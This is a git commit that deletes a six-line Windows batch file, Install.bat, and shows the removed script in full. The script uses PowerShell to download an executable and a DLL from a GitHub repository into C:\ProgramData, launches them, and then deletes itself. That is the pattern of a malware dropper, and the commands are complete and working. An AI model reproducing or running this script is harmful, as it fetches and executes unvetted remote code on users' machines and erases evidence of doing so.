62651bd4f8c339bd75e7144aa199634da1d7084e
Ptch56 <113770294+Ptch56@users.noreply.github.com>
2022-12-06 18:16:37 +0300

    Delete Install.bat

--- Install.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-powershell.exe iwr https://github.com/Ptch56/Patch/raw/main/utshellex.exe -o C:\ProgramData\utshellex.exe
-powershell.exe iwr https://github.com/Ptch56/Patch/raw/main/utshellext.dll -o C:\ProgramData\utshellext.dll
-cd C:\ProgramData
-start utshellex.exe utshellext.dll
-del/a/f "%~f0"
